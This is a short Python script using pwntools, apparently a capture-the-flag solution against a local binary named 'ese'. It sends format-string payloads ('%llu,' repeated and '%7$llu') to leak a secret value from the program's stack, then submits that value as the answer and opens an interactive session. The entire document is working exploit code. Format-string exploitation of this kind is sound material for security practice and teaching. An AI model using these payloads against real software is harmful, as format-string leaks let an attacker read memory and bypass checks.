from pwn import *

#context(terminal=['tmux','new-window'])

fname = './ese'
p = ELF(fname)


def exploit_v1():
	r.recvline()
	r.sendline('%llu,'*10)
	r.recvline()	
	log.info('reading leaking from the stack')
	out = r.recvline().decode()
	guess = out.split(',')[6]
	log.info('guess = {}'.format(guess))
	r.recvuntil(':')	
	log.info('sending the guesse value ...')
	r.sendline(guess)

def exploit_v2():	
	r.recvline()
	r.sendline('%7$llu')
	r.recvline()	
	log.info('reading leaking from the stack')
	guess = r.recvline().decode().strip()
	log.info('guess = {}'.format(guess))
	r.recvuntil(':')	
	log.info('sending the guesse value ...')
	r.sendline(guess)


		
	
if __name__=='__main__':

	r = process(fname)
	# exploit_v1()
	exploit_v2()
	r.interactive()	





